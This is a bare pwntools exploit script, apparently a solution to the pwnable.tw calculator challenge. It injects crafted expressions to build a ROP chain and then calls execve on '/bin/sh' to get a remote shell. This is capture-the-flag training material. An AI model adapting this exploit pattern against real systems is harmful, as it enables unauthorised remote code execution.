from pwn import *

host ='chall.pwnable.tw'
port = 10100

p = remote(host, port)

pop_eax = 0x080bc546
eax3 = 0x08090890
pop_ecx_ebx = 0x080701d1
pop_ebx = 0x080481d1
pop_esp = 0x080bc4f6
int_x80 = 0x8070880
data_sect = 0x80eb0b0
read = 0x806e6e7

execve_scall = 11

payload = '00%00%00%00%00%00%00%00%00'

p.recvuntil(b'=== Welcome to SECPROG calculator ===\x0a')
payload += '+' + str(pop_ecx_ebx + data_sect) + '%1-' + str(data_sect) + '%1+' + str(read) + '%1' + \
			'-' + str(read) + '%1-' + str(pop_esp) + '%1-' + str(pop_esp + data_sect) + '%1-' + \
			str(data_sect)
	
print(payload)

p.sendline(payload.encode())

payload = p32(pop_eax) + p32(0xb) + p32(pop_ecx_ebx - 1) + p32(0) * 2 + p32(data_sect + 0x1c) + p32(int_x80) + b'/bin/sh\x00'

p.sendline(payload)

p.interactive()
